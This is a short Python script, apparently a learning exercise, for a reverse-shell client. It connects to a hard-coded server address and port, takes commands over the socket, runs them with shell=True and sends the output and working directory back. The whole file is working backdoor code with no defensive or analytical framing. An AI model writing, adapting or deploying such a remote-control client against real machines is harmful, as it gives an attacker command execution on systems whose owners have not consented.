import socket, os , subprocess

def main():
    print("this is client socket")
    # Creating the client socket 
    client = socket.socket()
    # servers ip, port 
    host = "127.0.1.1"
    port = 4000
    # connecting the client to the server 
    client.connect((host, port))

    while True:
        # variable to store incomming data
        data = client.recv(1024) # buffer size
        # just checkng for the first 2 index characters 
        if data[:2].decode("utf-8") == "cd":
            try:
                os.chdir(data[3:].decode("utf-8"))
            except FileNotFoundError:
                pass
        if len(data) >0:
            # now we execute requested processes 
            command = subprocess.Popen(data.decode("utf8"), shell = True,\
            # piping stdin, stdout, stderr to TCP connection 
            stdout = subprocess.PIPE, stdin = subprocess.PIPE,\
            stderr = subprocess.PIPE)
            # preparing some feedbacks to send back to the server 
            output_byte = command.stdout.read() + command.stderr.read()
            output_str = str(output_byte, "utf-8")
            # encode and sending back t the server 
            client.send(str.encode(output_str +(os.getcwd())))
    client.close()
    
if __name__ == "__main__":
    main()
    
